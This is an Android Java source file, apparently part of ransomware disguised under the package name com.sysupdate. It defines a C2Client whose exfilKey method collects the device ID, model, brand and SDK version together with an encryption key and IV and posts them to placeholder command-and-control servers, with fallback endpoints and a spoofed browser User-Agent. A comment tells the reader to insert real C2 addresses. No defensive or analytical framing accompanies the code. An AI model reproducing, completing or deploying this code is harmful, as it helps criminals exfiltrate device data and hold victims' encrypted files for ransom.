package com.sysupdate;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import okhttp3.*;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

public class C2Client {

    // ── Replace with your actual C2 endpoints (rotate for redundancy) ─────────
    private static final String[] C2_URLS = {
        "https://your-primary-c2.com/api/collect",
        "https://your-backup-c2.net/api/collect"
    };

    private static final OkHttpClient HTTP = new OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.SECONDS)
        .build();

    // Returns true only if at least one C2 acknowledged receipt
    public static boolean exfilKey(Context ctx, String keyHex, String ivHex) {
        String androidId = Settings.Secure.getString(
            ctx.getContentResolver(), Settings.Secure.ANDROID_ID);

        String body = "device_id="  + androidId
                    + "&model="     + Build.MODEL.replace(" ", "_")
                    + "&brand="     + Build.BRAND
                    + "&sdk="       + Build.VERSION.SDK_INT
                    + "&key="       + keyHex
                    + "&iv="        + ivHex;

        RequestBody rb = RequestBody.create(
            body, MediaType.parse("application/x-www-form-urlencoded"));

        for (String url : C2_URLS) {
            try {
                Request req = new Request.Builder()
                    .url(url)
                    .post(rb)
                    .addHeader("User-Agent",
                        "Mozilla/5.0 (Linux; Android " +
                        Build.VERSION.RELEASE + "; " + Build.MODEL + ")")
                    .addHeader("X-Request-ID", androidId)
                    .build();

                try (Response resp = HTTP.newCall(req).execute()) {
                    if (resp.isSuccessful()) return true;
                }
            } catch (IOException ignored) {}
        }
        return false; // all C2 endpoints failed
    }
          }
